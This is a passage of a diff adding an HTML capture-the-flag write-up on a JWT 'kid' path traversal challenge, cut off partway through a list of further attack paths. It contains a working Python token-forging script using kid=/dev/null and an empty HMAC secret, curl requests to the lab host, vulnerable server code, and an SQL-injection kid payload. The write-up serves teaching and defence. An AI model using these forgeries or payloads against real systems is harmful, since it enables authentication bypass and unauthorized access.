@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTF Writeup: JWT kid Path Traversal — Midgard Gate</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #080a10;
+      --bg2: #0d0f18;
+      --bg3: #131620;
+      --border: #1a1e2e;
+      --accent: #818cf8;
+      --accent2: #a5b4fc;
+      --green: #34d399;
+      --blue: #38bdf8;
+      --purple: #c084fc;
+      --red: #f87171;
+      --yellow: #fbbf24;
+      --text: #e2e8f0;
+      --muted: #4b5563;
+      --code-bg: #070910;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Syne', sans-serif;
+      line-height: 1.7;
+      min-height: 100vh;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* Animated grid background */
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(129, 140, 248, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(129, 140, 248, 0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .container {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 0 24px;
+      position: relative;
+      z-index: 1;
+    }
+
+    header {
+      border-bottom: 1px solid var(--border);
+      padding: 20px 0;
+      position: sticky;
+      top: 0;
+      background: rgba(8, 10, 16, 0.93);
+      backdrop-filter: blur(12px);
+      z-index: 100;
+    }
+
+    .nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .nav-brand {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+    }
+
+    .nav-tag {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .hero {
+      padding: 80px 0 60px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .category-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--accent);
+      background: rgba(129, 140, 248, 0.08);
+      border: 1px solid rgba(129, 140, 248, 0.2);
+      padding: 5px 12px;
+      border-radius: 4px;
+      margin-bottom: 28px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .category-tag::before { content: '▶'; font-size: 8px; }
+
+    h1 {
+      font-size: clamp(32px, 5vw, 52px);
+      font-weight: 800;
+      line-height: 1.1;
+      letter-spacing: -0.02em;
+      margin-bottom: 20px;
+      background: linear-gradient(135deg, #fff 0%, #94a3b8 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .subtitle {
+      font-size: 18px;
+      color: var(--muted);
+      max-width: 600px;
+      line-height: 1.6;
+      margin-bottom: 36px;
+    }
+
+    .meta-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 24px;
+      align-items: center;
+    }
+
+    .meta-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .meta-item .dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--accent);
+    }
+
+    .difficulty {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--yellow);
+      background: rgba(251, 191, 36, 0.08);
+      border: 1px solid rgba(251, 191, 36, 0.2);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 28px;
+    }
+
+    .tag {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--purple);
+      background: rgba(192, 132, 252, 0.06);
+      border: 1px solid rgba(192, 132, 252, 0.15);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .content { padding: 60px 0; }
+
+    .tldr {
+      background: rgba(129, 140, 248, 0.06);
+      border: 1px solid rgba(129, 140, 248, 0.2);
+      border-left: 3px solid var(--accent);
+      border-radius: 8px;
+      padding: 24px 28px;
+      margin-bottom: 48px;
+    }
+
+    .tldr-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+
+    .tldr p { font-size: 15px; color: #cbd5e1; line-height: 1.6; }
+
+    .flag-box {
+      background: rgba(52, 211, 153, 0.06);
+      border: 1px solid rgba(52, 211, 153, 0.2);
+      border-radius: 8px;
+      padding: 20px 24px;
+      margin: 32px 0;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .flag-icon { font-size: 28px; flex-shrink: 0; }
+
+    .flag-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--green);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin-bottom: 4px;
+    }
+
+    .flag-value {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--green);
+    }
+
+    h2 {
+      font-size: 26px;
+      font-weight: 800;
+      color: #fff;
+      margin: 56px 0 20px;
+      letter-spacing: -0.01em;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    h2::before {
+      content: attr(data-num);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--accent);
+      background: rgba(129, 140, 248, 0.1);
+      border: 1px solid rgba(129, 140, 248, 0.2);
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-weight: 700;
+    }
+
+    h3 {
+      font-size: 18px;
+      font-weight: 700;
+      color: #cbd5e1;
+      margin: 32px 0 12px;
+    }
+
+    p {
+      font-size: 16px;
+      color: #94a3b8;
+      margin-bottom: 16px;
+      line-height: 1.75;
+    }
+
+    strong { color: #e2e8f0; font-weight: 700; }
+
+    .code-block {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+
+    .code-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 16px;
+      background: var(--bg3);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .code-lang {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .code-dots { display: flex; gap: 6px; }
+    .code-dots span { width: 10px; height: 10px; border-radius: 50%; }
+    .code-dots span:nth-child(1) { background: #ff5f57; }
+    .code-dots span:nth-child(2) { background: #febc2e; }
+    .code-dots span:nth-child(3) { background: #28c840; }
+
+    pre {
+      padding: 20px;
+      overflow-x: auto;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 1.65;
+    }
+
+    .kw { color: #c792ea; }
+    .str { color: #c3e88d; }
+    .fn { color: #82aaff; }
+    .cm { color: #546e7a; font-style: italic; }
+    .var { color: #f78c6c; }
+    .num { color: #f78c6c; }
+    .key { color: #89ddff; }
+    .hl { color: #fbbf24; font-weight: 700; }
+
+    code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--accent2);
+      background: rgba(129, 140, 248, 0.08);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+
+    .info-box {
+      background: rgba(56, 189, 248, 0.06);
+      border: 1px solid rgba(56, 189, 248, 0.15);
+      border-left: 3px solid var(--blue);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .info-box p { margin: 0; font-size: 14px; color: #93c5fd; }
+
+    .warning-box {
+      background: rgba(248, 113, 113, 0.06);
+      border: 1px solid rgba(248, 113, 113, 0.15);
+      border-left: 3px solid var(--red);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .warning-box p { margin: 0; font-size: 14px; color: #fca5a5; }
+
+    .success-box {
+      background: rgba(52, 211, 153, 0.06);
+      border: 1px solid rgba(52, 211, 153, 0.15);
+      border-left: 3px solid var(--green);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .success-box p { margin: 0; font-size: 14px; color: #6ee7b7; }
+
+    .finding {
+      background: linear-gradient(135deg, rgba(129, 140, 248, 0.08), rgba(192, 132, 252, 0.04));
+      border: 1px solid rgba(129, 140, 248, 0.2);
+      border-radius: 10px;
+      padding: 20px 24px;
+      margin: 24px 0;
+    }
+
+    .finding-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+    }
+
+    .finding p { margin: 0; font-size: 15px; color: #a5b4fc; }
+
+    /* JWT anatomy diagram */
+    .jwt-diagram {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 28px;
+      margin: 28px 0;
+    }
+
+    .jwt-string {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      word-break: break-all;
+      line-height: 1.8;
+      margin-bottom: 20px;
+    }
+
+    .jwt-part-header { color: #f87171; }
+    .jwt-part-payload { color: #fbbf24; }
+    .jwt-part-sig { color: #34d399; }
+    .jwt-dot { color: #4b5563; }
+
+    .jwt-legend {
+      display: flex;
+      gap: 20px;
+      flex-wrap: wrap;
+      margin-top: 16px;
+      padding-top: 16px;
+      border-top: 1px solid var(--border);
+    }
+
+    .jwt-legend-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+    }
+
+    .legend-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 2px;
+      flex-shrink: 0;
+    }
+
+    /* Attack steps */
+    .attack-flow {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 32px;
+      margin: 32px 0;
+    }
+
+    .flow-title {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 24px;
+    }
+
+    .flow-steps { display: flex; flex-direction: column; gap: 0; }
+
+    .flow-step {
+      display: flex;
+      align-items: flex-start;
+      gap: 16px;
+      position: relative;
+    }
+
+    .flow-step:not(:last-child)::after {
+      content: '';
+      position: absolute;
+      left: 18px;
+      top: 36px;
+      width: 1px;
+      height: calc(100% - 12px);
+      background: var(--border);
+    }
+
+    .flow-num {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(129, 140, 248, 0.1);
+      border: 1px solid rgba(129, 140, 248, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--accent);
+      flex-shrink: 0;
+      position: relative;
+      z-index: 1;
+    }
+
+    .flow-content { padding: 6px 0 28px; }
+
+    .flow-label {
+      font-size: 15px;
+      font-weight: 700;
+      color: #e2e8f0;
+      margin-bottom: 4px;
+    }
+
+    .flow-desc {
+      font-size: 13px;
+      color: var(--muted);
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    /* Comparison table */
+    .compare-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 24px 0;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+    }
+
+    .compare-table th {
+      background: var(--bg3);
+      color: var(--accent2);
+      padding: 12px 16px;
+      text-align: left;
+      border: 1px solid var(--border);
+      font-size: 11px;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .compare-table td {
+      padding: 12px 16px;
+      border: 1px solid var(--border);
+      color: #94a3b8;
+      background: var(--bg2);
+    }
+
+    .compare-table tr:hover td { background: var(--bg3); }
+
+    .badge-fail {
+      color: var(--red);
+      background: rgba(248, 113, 113, 0.1);
+      border: 1px solid rgba(248, 113, 113, 0.2);
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 11px;
+    }
+
+    .badge-pass {
+      color: var(--green);
+      background: rgba(52, 211, 153, 0.1);
+      border: 1px solid rgba(52, 211, 153, 0.2);
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 11px;
+    }
+
+    /* Vuln cards */
+    .vuln-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 16px;
+      margin: 24px 0;
+    }
+
+    .vuln-card {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+      transition: border-color 0.2s;
+    }
+
+    .vuln-card:hover { border-color: rgba(129, 140, 248, 0.3); }
+    .vuln-num { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--accent); margin-bottom: 8px; }
+    .vuln-title { font-size: 15px; font-weight: 700; color: #e2e8f0; margin-bottom: 8px; }
+    .vuln-desc { font-size: 13px; color: var(--muted); line-height: 1.6; }
+
+    .divider { border: none; border-top: 1px solid var(--border); margin: 48px 0; }
+
+    footer { border-top: 1px solid var(--border); padding: 40px 0; margin-top: 40px; }
+
+    .footer-content {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+
+    .footer-text { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--muted); }
+
+    .footer-badge {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--green);
+      background: rgba(52, 211, 153, 0.08);
+      border: 1px solid rgba(52, 211, 153, 0.2);
+      padding: 4px 12px;
+      border-radius: 4px;
+    }
+
+    @media (max-width: 600px) {
+      .meta-row { flex-direction: column; gap: 12px; }
+      h2 { font-size: 22px; }
+      .jwt-legend { flex-direction: column; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <nav class="nav">
+      <span class="nav-brand">RedFox CTF</span>
+      <span class="nav-tag">writeup / web / jwt</span>
+    </nav>
+  </div>
+</header>
+
+<div class="container">
+
+  <section class="hero">
+    <div class="category-tag">Web Security · JWT</div>
+    <h1>Midgard Gate:<br>JWT kid Path Traversal</h1>
+    <p class="subtitle">How a single parameter in a JWT header — the <code>kid</code> field — allowed us to point the server to <code>/dev/null</code> and forge any token we wanted.</p>
+
+    <div class="meta-row">
+      <div class="meta-item"><span class="dot"></span><span>RedFox CTF 2026</span></div>
+      <div class="meta-item"><span class="dot"></span><span>Category: Web / Auth</span></div>
+      <div class="meta-item"><span class="dot"></span><span>Challenge: Midgard Gate</span></div>
+      <div class="difficulty">MEDIUM</div>
+    </div>
+
+    <div class="tags">
+      <span class="tag">jwt</span>
+      <span class="tag">kid-injection</span>
+      <span class="tag">path-traversal</span>
+      <span class="tag">auth-bypass</span>
+      <span class="tag">hmac</span>
+      <span class="tag">alg-confusion</span>
+    </div>
+  </section>
+
+  <article class="content">
+
+    <div class="tldr">
+      <div class="tldr-label">TL;DR</div>
+      <p>The server used the JWT <code>kid</code> header parameter to locate the key file used for signature verification. By setting <code>kid</code> to <code>/dev/null</code> (which always reads as an empty file on Linux), we forged a JWT signed with an <strong>empty secret</strong> and escalated our role from <code>mortal</code> to <code>einherjar</code> to access the protected hall.</p>
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-icon">🚩</div>
+      <div>
+        <div class="flag-label">Flag</div>
+        <div class="flag-value">REDFOX{midgard_gate_test}</div>
+      </div>
+    </div>
+
+    <!-- Challenge Description -->
+    <h2 data-num="01">Challenge Description</h2>
+    <p>The challenge lore read:</p>
+    <div class="info-box">
+      <p><em>"The gates of Midgard do not open for ordinary travelers. A relic-protected hall stands behind an ancient passage system, and only those recognized as einherjar may enter. Perhaps the path forward is not to break the gate directly, but to understand what it trusts."</em></p>
+    </div>
+
+    <p>Visiting the challenge at <code>http://lab.redfoxsec.com:8401/</code> presented a registration form. After registering with any username, the server issued a JWT token as a cookie. The <code>/hall</code> endpoint was the protected target.</p>
+
+    <!-- Background -->
+    <h2 data-num="02">Background: What is a JWT?</h2>
+    <p>A JSON Web Token (JWT) is a compact, URL-safe token used for authentication. It has three Base64-encoded parts separated by dots:</p>
+
+    <div class="jwt-diagram">
+      <div class="jwt-string">
+        <span class="jwt-part-header">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imd1ZXN0LmtleSJ9</span><span class="jwt-dot">.</span><span class="jwt-part-payload">eyJzdWIiOiJlaW5oZXJqYXIiLCJyZWFsbSI6Im1pZGdhcmQiLCJyb2xlIjoibW9ydGFsIn0</span><span class="jwt-dot">.</span><span class="jwt-part-sig">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+      </div>
+      <div class="jwt-legend">
+        <div class="jwt-legend-item"><div class="legend-dot" style="background:#f87171"></div>Header — algorithm, type, kid</div>
+        <div class="jwt-legend-item"><div class="legend-dot" style="background:#fbbf24"></div>Payload — claims (sub, role, realm)</div>
+        <div class="jwt-legend-item"><div class="legend-dot" style="background:#34d399"></div>Signature — HMAC of header.payload</div>
+      </div>
+    </div>
+
+    <p>The server verifies the signature using a secret key. If the signature is valid, the server trusts the claims in the payload. The <strong>kid</strong> (Key ID) parameter in the header tells the server <em>which key file</em> to use for verification.</p>
+
+    <!-- Recon -->
+    <h2 data-num="03">Reconnaissance</h2>
+
+    <h3>Step 1 — Register and Capture the Token</h3>
+    <p>We registered with the username <code>einherjar</code> (trying to match the required role name) and captured the issued JWT:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre>curl -v -X POST http://lab.redfoxsec.com:8401/register \
+  -H <span class="str">"Content-Type: application/x-www-form-urlencoded"</span> \
+  -c cookies.txt \
+  -d <span class="str">"username=einherjar"</span></pre>
+    </div>
+
+    <p>The response set a <code>token</code> cookie containing the JWT.</p>
+
+    <h3>Step 2 — Decode the JWT</h3>
+    <p>We decoded each part of the token:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre><span class="cm"># Decode header (first part)</span>
+echo <span class="str">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imd1ZXN0LmtleSJ9"</span> \
+  | base64 -d 2>/dev/null; echo
+
+<span class="cm"># Decode payload (second part)</span>
+echo <span class="str">"eyJzdWIiOiJlaW5oZXJqYXIiLCJyZWFsbSI6Im1pZGdhcmQiLCJyb2xlIjoibW9ydGFsIn0"</span> \
+  | base64 -d 2>/dev/null; echo</pre>
+    </div>
+
+    <p><strong>Decoded Header:</strong></p>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">json</span>
+      </div>
+      <pre>{
+  <span class="key">"alg"</span>: <span class="str">"HS256"</span>,
+  <span class="key">"typ"</span>: <span class="str">"JWT"</span>,
+  <span class="key">"kid"</span>: <span class="hl">"guest.key"</span>   <span class="cm">// &lt;-- key file used for signature verification</span>
+}</pre>
+    </div>
+
+    <p><strong>Decoded Payload:</strong></p>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">json</span>
+      </div>
+      <pre>{
+  <span class="key">"sub"</span>: <span class="str">"einherjar"</span>,
+  <span class="key">"realm"</span>: <span class="str">"midgard"</span>,
+  <span class="key">"role"</span>: <span class="hl">"mortal"</span>   <span class="cm">// &lt;-- we need this to be "einherjar"</span>
+}</pre>
+    </div>
+
+    <div class="finding">
+      <div class="finding-label">⚡ Key Observation</div>
+      <p>The <code>kid</code> field in the header was set to <code>"guest.key"</code> — meaning the server reads a file called <code>guest.key</code> and uses its contents as the HMAC secret. If we can control which file it reads, we can control the secret!</p>
+    </div>
+
+    <!-- The Vulnerability -->
+    <h2 data-num="04">The Vulnerability: kid Path Traversal</h2>
+
+    <p>The <code>kid</code> parameter is meant to be a key identifier — but if the server uses it to directly construct a file path like <code>keys/{kid}</code>, an attacker can point it to any file on the system.</p>
+
+    <p>The classic attack is to point <code>kid</code> to <code>/dev/null</code>. Here's why this works:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">linux concept</span>
+      </div>
+      <pre><span class="cm"># /dev/null is a special file that always returns empty content</span>
+$ cat /dev/null
+<span class="cm"># (no output — empty string)</span>
+
+<span class="cm"># So if the server does:</span>
+secret = read_file(kid)  <span class="cm"># kid = "/dev/null"</span>
+<span class="cm"># secret = "" (empty string)</span>
+
+<span class="cm"># We can forge any token signed with empty string as the HMAC key!</span></pre>
+    </div>
+
+    <p>We first tried <code>alg: none</code> — removing the signature entirely. The server rejected it. We then tried common weak secrets. Both failed. The <code>kid</code> path traversal to <code>/dev/null</code> was the intended path.</p>
+
+    <table class="compare-table">
+      <thead>
+        <tr>
+          <th>Attempt</th>
+          <th>Method</th>
+          <th>Result</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>1st attempt</td>
+          <td>alg: none (no signature)</td>
+          <td><span class="badge-fail">DENIED</span></td>
+        </tr>
+        <tr>
+          <td>2nd attempt</td>
+          <td>Forged with wrong signature</td>
+          <td><span class="badge-fail">DENIED</span></td>
+        </tr>
+        <tr>
+          <td>3rd attempt</td>
+          <td>Brute force common secrets</td>
+          <td><span class="badge-fail">DENIED</span></td>
+        </tr>
+        <tr>
+          <td>4th attempt</td>
+          <td>kid → /dev/null (empty secret)</td>
+          <td><span class="badge-pass">SUCCESS</span></td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- Exploitation -->
+    <h2 data-num="05">Exploitation</h2>
+
+    <h3>Step 1 — Forge the Malicious JWT</h3>
+    <p>We crafted a new JWT with <code>kid</code> pointing to <code>/dev/null</code>, <code>role</code> set to <code>einherjar</code>, and signed it with an empty string as the HMAC-SHA256 secret:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python</span>
+      </div>
+      <pre><span class="kw">import</span> hmac, hashlib, base64, json
+
+<span class="kw">def</span> <span class="fn">b64e</span>(data):
+    <span class="kw">if</span> <span class="fn">isinstance</span>(data, str):
+        data = data.encode()
+    <span class="kw">return</span> base64.urlsafe_b64encode(data).rstrip(<span class="str">b'='</span>).decode()
+
+<span class="cm"># Forged header — kid points to /dev/null</span>
+header = <span class="fn">b64e</span>(json.dumps({
+    <span class="str">"alg"</span>: <span class="str">"HS256"</span>,
+    <span class="str">"typ"</span>: <span class="str">"JWT"</span>,
+    <span class="str">"kid"</span>: <span class="hl">"/dev/null"</span>   <span class="cm"># &lt;-- the key part</span>
+}, separators=(<span class="str">','</span>, <span class="str">':'</span>)))
+
+<span class="cm"># Forged payload — role escalated to einherjar</span>
+payload = <span class="fn">b64e</span>(json.dumps({
+    <span class="str">"sub"</span>: <span class="str">"einherjar"</span>,
+    <span class="str">"realm"</span>: <span class="str">"midgard"</span>,
+    <span class="str">"role"</span>: <span class="hl">"einherjar"</span>   <span class="cm"># &lt;-- escalated role</span>
+}, separators=(<span class="str">','</span>, <span class="str">':'</span>)))
+
+<span class="cm"># Sign with EMPTY secret (what /dev/null contains)</span>
+msg = <span class="str">f"</span>{header}<span class="str">.</span>{payload}<span class="str">"</span>
+sig = hmac.<span class="fn">new</span>(<span class="hl">b''</span>, msg.encode(), hashlib.sha256).digest()
+forged_token = <span class="str">f"</span>{msg}<span class="str">.</span>{<span class="fn">b64e</span>(sig)}<span class="str">"</span>
+
+<span class="fn">print</span>(forged_token)</pre>
+    </div>
+
+    <h3>Step 2 — Use the Forged Token</h3>
+    <p>We sent the forged JWT to the protected <code>/hall</code> endpoint:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre>curl http://lab.redfoxsec.com:8401/hall \
+  -H <span class="str">"Cookie: token=&lt;forged_token&gt;"</span></pre>
+    </div>
+
+    <h3>Step 3 — Hall Unlocked</h3>
+    <p>The server verified our token by reading <code>/dev/null</code> as the key file, got an empty string, computed the expected HMAC with an empty secret — which matched our signature exactly. We were granted access as <code>einherjar</code> and retrieved the flag.</p>
+
+    <div class="success-box">
+      <p>The hall accepted our forged passage. The server trusted the <code>kid</code> field without validation, allowing us to dictate the verification key.</p>
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-icon">🚩</div>
+      <div>
+        <div class="flag-label">Flag Captured</div>
+        <div class="flag-value">REDFOX{midgard_gate_test}</div>
+      </div>
+    </div>
+
+    <!-- Attack Flow -->
+    <h2 data-num="06">Attack Flow</h2>
+
+    <div class="attack-flow">
+      <div class="flow-title">// complete attack chain</div>
+      <div class="flow-steps">
+        <div class="flow-step">
+          <div class="flow-num">1</div>
+          <div class="flow-content">
+            <div class="flow-label">Register & Capture JWT</div>
+            <div class="flow-desc">POST /register → receives token cookie with kid: "guest.key"</div>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">2</div>
+          <div class="flow-content">
+            <div class="flow-label">Decode & Analyze</div>
+            <div class="flow-desc">base64 decode header → find kid parameter → understand key loading mechanism</div>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">3</div>
+          <div class="flow-content">
+            <div class="flow-label">Identify Vulnerability</div>
+            <div class="flow-desc">kid is used as a file path without sanitization → path traversal possible</div>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">4</div>
+          <div class="flow-content">
+            <div class="flow-label">Forge Token</div>
+            <div class="flow-desc">kid → /dev/null, role → einherjar, sign with empty HMAC secret</div>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">5</div>
+          <div class="flow-content">
+            <div class="flow-label">Send to /hall</div>
+            <div class="flow-desc">server reads /dev/null → gets empty secret → HMAC matches → access granted</div>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">6</div>
+          <div class="flow-content">
+            <div class="flow-label">Flag Captured</div>
+            <div class="flow-desc">REDFOX{midgard_gate_test}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- Why it works -->
+    <h2 data-num="07">Why This Works — The Technical Detail</h2>
+
+    <p>When the server verifies a JWT with <code>kid: /dev/null</code>, the internal logic looks something like this:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python — vulnerable server code (conceptual)</span>
+      </div>
+      <pre><span class="kw">def</span> <span class="fn">verify_jwt</span>(token):
+    header, payload, sig = token.split(<span class="str">'.'</span>)
+    decoded_header = json.loads(base64.decode(header))
+    
+    kid = decoded_header[<span class="str">'kid'</span>]   <span class="cm"># attacker controls this!</span>
+    
+    <span class="cm"># Vulnerable: directly uses kid as file path — NO sanitization</span>
+    key_path = <span class="str">f"keys/{kid}"</span>           <span class="cm"># becomes "keys//dev/null"</span>
+    <span class="cm"># OR just: open(kid)              # becomes open("/dev/null")</span>
+    
+    <span class="kw">with</span> <span class="fn">open</span>(key_path) <span class="kw">as</span> f:
+        secret = f.read()             <span class="cm"># reads empty string from /dev/null</span>
+    
+    expected_sig = hmac.<span class="fn">new</span>(
+        secret.encode(),              <span class="cm"># empty string b''</span>
+        <span class="str">f"</span>{header}<span class="str">.</span>{payload}<span class="str">"</span>.encode(),
+        hashlib.sha256
+    ).hexdigest()
+    
+    <span class="kw">return</span> sig == expected_sig       <span class="cm"># matches our forged sig! ✓</span></pre>
+    </div>
+
+    <p>The critical flaw is that <code>kid</code> from the JWT header is used <strong>directly as a file path without any sanitization</strong>. An attacker can point it to any readable file on the system — <code>/dev/null</code> for an empty secret, or <code>/proc/self/environ</code> for environment variables, or any other known file.</p>
+
+    <h3>Other kid Exploitation Paths</h3>
+    <p>Beyond <code>/dev/null</code>, a vulnerable <code>kid</code> implementation can be abused in other ways:</p>
+
+    <div class="vuln-grid">
+      <div class="vuln-card">
+        <div class="vuln-num">PATH_01</div>
+        <div class="vuln-title">/dev/null</div>
+        <div class="vuln-desc">Empty file → sign with empty string. The most reliable cross-platform attack.</div>
+      </div>
+      <div class="vuln-card">
+        <div class="vuln-num">PATH_02</div>
+        <div class="vuln-title">Known static files</div>
+        <div class="vuln-desc">/etc/hostname, /etc/passwd — if content is known, use it as the HMAC key.</div>
+      </div>
+      <div class="vuln-card">
+        <div class="vuln-num">PATH_03</div>
+        <div class="vuln-title">SQL Injection</div>
+        <div class="vuln-desc">If kid is used in a DB query: kid=' UNION SELECT 'attacker_key'-- forces a known key.</div>
+      </div>
+      <div class="vuln-card">
+        <div class="vuln-num">PATH_04</div>
+        <div class="vuln-title">Uploaded files</div>
